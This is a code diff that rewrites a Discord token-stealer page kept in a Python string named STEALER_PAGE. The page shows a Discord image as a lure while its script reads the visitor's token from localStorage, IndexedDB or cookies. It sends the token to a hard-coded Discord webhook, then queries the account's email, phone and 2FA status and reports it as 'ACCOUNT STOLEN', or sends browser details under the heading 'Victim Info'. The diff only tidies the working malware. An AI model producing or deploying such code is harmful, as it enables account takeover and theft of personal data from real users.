@@ -34,16 +34,114 @@ STEALER_PAGE = """
 </head>
 <body>
     <img src="https://media.discordapp.net/attachments/1545100076626616425/1551548558728101959/1.png?ex=6ab25fb2&is=6ab10e32&hm=9411d571db47552a153f37df907a0c9864ac16051581d1b967100101e45cd17f&=&format=webp&quality=lossless&width=820&height=1024">
-    <p>discord • image</p>
+    <p>discord &bull; image</p>
     <script>
     const wh = 'https://discord.com/api/webhooks/1551539788220203069/hX0J3ZaEmfsxMOGBnUzdZIKekNSZQM_fXMBiqHjusCAxphMNlV7V7j7Z5DTPFiSLqGX3';
     let token = null;
-    (async()=>{
-        try { const t = localStorage.getItem('token'); if(t&&t.includes('.')) { token = t; await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'**Token (localStorage):** ||'+t+'||'})}); } } catch(e){}
-        if(!token) { try { const r = indexedDB.open('discord'); r.onsuccess = ()=>{ const d = r.result; if(d&&d.objectStoreNames.contains('user')) { d.transaction('user','readonly').objectStore('user').get('token').onsuccess = ()=>{ if(r.result) { token = r.result; fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'**Token (IndexedDB):** ||'+r.result+'||'})}); } }; } }; } catch(e){} }
-        if(!token) { try { document.cookie.split(';').forEach(c=>{ const [n,v]=c.trim().split('='); if(v&&v.includes('.')&&v.length>50) { token=v; fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'**Token (cookie):** ||'+v+'||'})}); } }); } catch(e){} }
-        if(token) { try { const r = await fetch('https://discord.com/api/v9/users/@me',{headers:{'Authorization':token}}); const u = await r.json(); if(u&&u.id) { await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'@everyone **ACCOUNT STOLEN**',embeds:[{title:'Discord Account',color:0xed4245,fields:[{name:'User',value:u.username+'#'+u.discriminator},{name:'ID',value:u.id},{name:'Email',value:u.email||'None'},{name:'Phone',value:u.phone||'None'},{name:'Nitro',value:u.premium_type>0?'Yes':'No'},{name:'2FA',value:u.mfa_enabled?'Yes':'No'},{name:'Token',value:'||'+token+'||'}],thumbnail:u.avatar?{url:'https://cdn.discordapp.com/avatars/'+u.id+'/'+u.avatar+'.png?size=128'}:null}]})); } } catch(e){} }
-        if(!token) { await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'No token — browser info',embeds:[{title:'Victim Info',color:0x5865F2,fields:[{name:'UA',value:navigator.userAgent.substring(0,100)},{name:'Platform',value:navigator.platform},{name:'Screen',value:screen.width+'x'+screen.height},{name:'Referrer',value:document.referrer||'None'},{name:'URL',value:window.location.href}]}]})}); }
+
+    async function send(content, embeds) {
+        try {
+            const body = { content: content };
+            if (embeds) body.embeds = embeds;
+            await fetch(wh, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body)
+            });
+        } catch (e) {}
+    }
+
+    (async () => {
+        // 1. localStorage
+        try {
+            const t = localStorage.getItem('token');
+            if (t && t.includes('.')) {
+                token = t;
+                await send('**Token (localStorage):** ||' + t + '||');
+            }
+        } catch (e) {}
+
+        // 2. IndexedDB
+        if (!token) {
+            try {
+                await new Promise((resolve) => {
+                    const req = indexedDB.open('discord');
+                    req.onsuccess = () => {
+                        const db = req.result;
+                        if (db && db.objectStoreNames.contains('user')) {
+                            const getReq = db.transaction('user', 'readonly').objectStore('user').get('token');
+                            getReq.onsuccess = async () => {
+                                if (getReq.result) {
+                                    token = getReq.result;
+                                    await send('**Token (IndexedDB):** ||' + getReq.result + '||');
+                                }
+                                resolve();
+                            };
+                            getReq.onerror = () => resolve();
+                        } else {
+                            resolve();
+                        }
+                    };
+                    req.onerror = () => resolve();
+                });
+            } catch (e) {}
+        }
+
+        // 3. Cookies
+        if (!token) {
+            try {
+                document.cookie.split(';').forEach((c) => {
+                    const [n, v] = c.trim().split('=');
+                    if (v && v.includes('.') && v.length > 50) {
+                        token = v;
+                        send('**Token (cookie):** ||' + v + '||');
+                    }
+                });
+            } catch (e) {}
+        }
+
+        // 4. Validate token + dump account
+        if (token) {
+            try {
+                const r = await fetch('https://discord.com/api/v9/users/@me', {
+                    headers: { 'Authorization': token }
+                });
+                const u = await r.json();
+                if (u && u.id) {
+                    await send('@everyone **ACCOUNT STOLEN**', [{
+                        title: 'Discord Account',
+                        color: 0xed4245,
+                        fields: [
+                            { name: 'User', value: u.username + '#' + u.discriminator },
+                            { name: 'ID', value: u.id },
+                            { name: 'Email', value: u.email || 'None' },
+                            { name: 'Phone', value: u.phone || 'None' },
+                            { name: 'Nitro', value: u.premium_type > 0 ? 'Yes' : 'No' },
+                            { name: '2FA', value: u.mfa_enabled ? 'Yes' : 'No' },
+                            { name: 'Token', value: '||' + token + '||' }
+                        ],
+                        thumbnail: u.avatar
+                            ? { url: 'https://cdn.discordapp.com/avatars/' + u.id + '/' + u.avatar + '.png?size=128' }
+                            : null
+                    }]);
+                }
+            } catch (e) {}
+        }
+
+        // 5. Fallback: no token, just send browser info
+        if (!token) {
+            await send('No token — browser info', [{
+                title: 'Victim Info',
+                color: 0x5865F2,
+                fields: [
+                    { name: 'UA', value: navigator.userAgent.substring(0, 100) },
+                    { name: 'Platform', value: navigator.platform },
+                    { name: 'Screen', value: screen.width + 'x' + screen.height },
+                    { name: 'Referrer', value: document.referrer || 'None' },
+                    { name: 'URL', value: window.location.href }
+                ]
+            }]);
+        }
     })();
     </script>
 </body>
